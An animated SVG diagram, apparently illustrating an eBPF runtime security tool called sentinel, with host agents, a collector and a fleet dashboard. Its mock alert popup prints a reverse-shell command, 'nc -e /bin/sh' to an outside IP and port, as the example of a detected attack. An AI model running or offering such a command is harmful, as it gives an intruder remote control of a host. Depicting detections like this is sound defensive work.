<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 960 400" width="960" height="400" font-family="ui-monospace, Menlo, Consolas, monospace">
  <style>
    .bg { fill: #0b0f14; }
    .card { fill: #0f151c; stroke: #243040; stroke-width: 1.2; }
    .title { fill: #d6e2ea; font-size: 14px; font-weight: 700; }
    .sub { fill: #7891a3; font-size: 11px; }
    .tiny { fill: #7891a3; font-size: 10px; }
    .kern { fill: #16202b; stroke: #2c3c4e; stroke-width: 1; }
    .kern-t { fill: #a893ff; font-size: 10px; }
    .wire { fill: none; stroke: #1f2c3a; stroke-width: 2; stroke-dasharray: 4 5; }
    .flow { fill: none; stroke: #2b4a66; stroke-width: 2; stroke-dasharray: 4 5; animation: dash 1.2s linear infinite; }
    .pkt { fill: #4fa3ff; }
    .pkt-alert { fill: #ff5555; }
    .dot-on { fill: #4fe08a; animation: pulse 1.6s ease-in-out infinite; }
    .row { fill: #121a23; }
    .row-t { fill: #9fb3c4; font-size: 10px; }
    .alert-row { fill: #2a1414; animation: blink 2.4s ease-in-out infinite; }
    .alert-t { fill: #ff9d9d; font-size: 10px; font-weight: 700; }
    .tg { fill: #1b2a3a; stroke: #2f80c4; stroke-width: 1.2; }
    .tg-t { fill: #8fc8ff; font-size: 10px; }
    .r1 { animation: rowin 6s ease-out infinite; }
    .r2 { animation: rowin 6s ease-out infinite 1s; }
    .r3 { animation: rowin 6s ease-out infinite 2s; }
    .r4 { animation: rowin 6s ease-out infinite 3s; }
    .tgpop { animation: tgpop 6s ease-out infinite 3s; opacity: 0; }
    @keyframes dash { to { stroke-dashoffset: -18; } }
    @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: .35; } }
    @keyframes blink { 0%,100% { fill: #2a1414; } 50% { fill: #4a1a1a; } }
    @keyframes rowin { 0% { opacity: 0; } 8% { opacity: 1; } 85% { opacity: 1; } 100% { opacity: 0; } }
    @keyframes tgpop { 0% { opacity: 0; transform: translateY(6px); } 8% { opacity: 1; transform: translateY(0); } 80% { opacity: 1; } 100% { opacity: 0; } }
  </style>

  <rect class="bg" x="0" y="0" width="960" height="400" rx="14"/>
  <text class="title" x="24" y="34">sentinel</text>
  <text class="sub" x="100" y="34">eBPF runtime security · agents → collector → dashboard</text>

  <!-- agents -->
  <g>
    <rect class="card" x="24" y="64" width="210" height="84" rx="9"/>
    <circle class="dot-on" cx="42" cy="84" r="4"/>
    <text class="title" x="54" y="88" font-size="12">web-01</text>
    <text class="tiny" x="160" y="88">10.0.0.11</text>
    <rect class="kern" x="38" y="102" width="182" height="34" rx="6"/>
    <text class="kern-t" x="48" y="118">kernel · eBPF probe</text>
    <text class="tiny" x="48" y="130">sched_process_exec</text>
  </g>
  <g>
    <rect class="card" x="24" y="160" width="210" height="84" rx="9"/>
    <circle class="dot-on" cx="42" cy="180" r="4"/>
    <text class="title" x="54" y="184" font-size="12">db-01</text>
    <text class="tiny" x="160" y="184">10.0.0.21</text>
    <rect class="kern" x="38" y="198" width="182" height="34" rx="6"/>
    <text class="kern-t" x="48" y="214">kernel · eBPF probe</text>
    <text class="tiny" x="48" y="226">sched_process_exec</text>
  </g>
  <g>
    <rect class="card" x="24" y="256" width="210" height="84" rx="9"/>
    <circle class="dot-on" cx="42" cy="276" r="4"/>
    <text class="title" x="54" y="280" font-size="12">k8s-node</text>
    <text class="tiny" x="160" y="280">10.0.0.31</text>
    <rect class="kern" x="38" y="294" width="182" height="34" rx="6"/>
    <text class="kern-t" x="48" y="310">kernel · eBPF probe</text>
    <text class="tiny" x="48" y="322">sched_process_exec</text>
  </g>

  <!-- wires agents -> server -->
  <path id="w1" class="flow" d="M234 106 C 300 106, 300 202, 372 202"/>
  <path id="w2" class="flow" d="M234 202 L 372 202"/>
  <path id="w3" class="flow" d="M234 298 C 300 298, 300 202, 372 202"/>
  <text class="tiny" x="262" y="190">WebSocket</text>

  <!-- packets -->
  <circle class="pkt" r="4"><animateMotion dur="2.2s" repeatCount="indefinite"><mpath href="#w1"/></animateMotion></circle>
  <circle class="pkt" r="4"><animateMotion dur="1.8s" begin="0.6s" repeatCount="indefinite"><mpath href="#w2"/></animateMotion></circle>
  <circle class="pkt-alert" r="5"><animateMotion dur="2.6s" begin="1.1s" repeatCount="indefinite"><mpath href="#w3"/></animateMotion></circle>

  <!-- server -->
  <rect class="card" x="372" y="128" width="200" height="148" rx="10"/>
  <text class="title" x="390" y="156">sentinel-server</text>
  <text class="sub" x="390" y="174">collector</text>
  <rect class="kern" x="388" y="188" width="168" height="26" rx="6"/>
  <text class="kern-t" x="398" y="205">auth · hello / heartbeat</text>
  <rect class="kern" x="388" y="222" width="168" height="26" rx="6"/>
  <text class="kern-t" x="398" y="239">SQLite · event history</text>
  <text class="tiny" x="390" y="266">:9000</text>

  <!-- server -> dashboard -->
  <path id="w4" class="flow" d="M572 202 L 640 202"/>
  <circle class="pkt" r="4"><animateMotion dur="1s" repeatCount="indefinite"><mpath href="#w4"/></animateMotion></circle>

  <!-- dashboard -->
  <rect class="card" x="640" y="64" width="296" height="276" rx="10"/>
  <text class="title" x="656" y="90">fleet dashboard</text>
  <rect x="844" y="78" width="38" height="16" rx="8" fill="#16432c"/>
  <text x="852" y="90" fill="#6fe3a1" font-size="10">live</text>
  <line x1="640" y1="104" x2="936" y2="104" stroke="#1c2733"/>
  <rect x="640" y="104" width="78" height="236" fill="#0d1218"/>
  <circle class="dot-on" cx="654" cy="124" r="3.5"/><text class="row-t" x="662" y="128">web-01</text>
  <circle class="dot-on" cx="654" cy="146" r="3.5"/><text class="row-t" x="662" y="150">db-01</text>
  <circle class="dot-on" cx="654" cy="168" r="3.5"/><text class="row-t" x="662" y="172">k8s-node</text>

  <g class="r1"><rect class="row" x="726" y="114" width="202" height="22" rx="4"/><text class="row-t" x="734" y="129">web-01  nginx      pid 812</text></g>
  <g class="r2"><rect class="row" x="726" y="140" width="202" height="22" rx="4"/><text class="row-t" x="734" y="155">db-01   psql       pid 1440</text></g>
  <g class="r3"><rect class="row" x="726" y="166" width="202" height="22" rx="4"/><text class="row-t" x="734" y="181">web-01  curl       pid 905</text></g>
  <g class="r4"><rect class="alert-row" x="726" y="192" width="202" height="22" rx="4"/><text class="alert-t" x="734" y="207">ALERT k8s-node  nc  pid 2207</text></g>

  <g class="tgpop">
    <rect class="tg" x="726" y="232" width="202" height="52" rx="8"/>
    <text class="tg-t" x="738" y="252">telegram · sentinel alert</text>
    <text class="tiny" x="738" y="270">nc -e /bin/sh 10.9.9.9 4444</text>
  </g>

  <text class="tiny" x="656" y="326">click a row → full cmdline</text>
</svg>
